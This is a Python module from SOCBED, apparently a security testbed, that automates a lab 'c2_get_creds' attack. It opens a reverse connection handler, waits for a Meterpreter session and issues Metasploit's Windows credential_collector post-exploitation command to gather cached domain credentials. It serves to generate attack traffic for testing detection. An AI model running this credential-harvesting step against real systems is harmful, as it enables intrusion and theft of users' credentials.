# Copyright 2016-2024 1ncludeSteven
#
# This file is part of SOCBED.
#
# SOCBED is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# SOCBED is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with SOCBED. If not, see <http://www.gnu.org/licenses/>.


import time

from attacks import AttackInfo
from attacks.c2_attack_options import C2AttackOptions, C2Attack
from attacks.reverseconnectionhandler import ReverseConnectionHandler


class C2GetCredsAttackOptions(C2AttackOptions):
    pass


class C2GetCredsAttack(C2Attack):
    info = AttackInfo(
        name="c2_get_creds",
        description="Obtains cached domain credentials")
    options_class = C2GetCredsAttackOptions
    handler = None

    def run(self):
        with self.check_printed("2aca7635afdc3febc4"):
            with self.wrap_ssh_exceptions():
                self._start_handler()
                self._handle_output()

    def _start_handler(self):
        self.handler = ReverseConnectionHandler(self.ssh_client, self.options.lhost, self.options.lport)
        self.handler.start()

    def _handle_output(self):
        try:
            for line in self.handler.stdout:
                self._respond(line)
                self.print(line)
        except UnicodeDecodeError as e:
            self.print(f"UnicodeDecodeError: {e}")
            self.handler.shutdown()

    def _respond(self, line):
        if ("Meterpreter session 1 opened" in line) or \
                ("Starting interaction with 1" in line):
            time.sleep(2)
            self._run_credentials()
        elif ("Backgrounding session " in line) or \
                ("Exploit completed, but no session was created" in line):
            self.handler.shutdown()

    def _run_credentials(self):
        self.ssh_client.write_lines(self.handler.stdin, [
            "run post/windows/gather/credentials/credential_collector",
            "bg"])
